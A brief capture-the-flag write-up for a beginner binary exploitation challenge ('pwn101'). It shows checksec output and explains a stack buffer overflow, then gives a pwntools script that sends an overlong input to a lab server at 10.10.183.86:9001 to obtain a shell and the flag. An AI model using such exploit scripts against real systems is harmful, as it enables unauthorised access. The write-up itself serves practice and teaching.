## Challenge 1
- Analyzing the binary. This includes static as well as dynamic analysis(if needed)
```sh
checksec pwn101
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
- Running the file we are given with a prompt where we have to enter some values
`Type the required ingredients to make briyani:`
- As we can see there is no stack canary so there might be a possibility of a buffer overflow, so let's see if we can make the program to return a segfault, by passing a long string.
`Thanks, Here's a small gift for you`
- Oh this was easy just like that it gives a shell. Writing a script for performing same on the server

```python
from pwn import *

binary = context = ELF("./pwn101-1644307211706.pwn101", checksec=False)

if args.REMOTE:
    p = remote('10.10.183.86', 9001)
else:
    p = process(binary.path)

payload = b"A"*100
p.sendline(payload)
p.interactive()

# run this by python3 chal1.py REMOTE
```
- And by this we can get the flag as we get the shell.
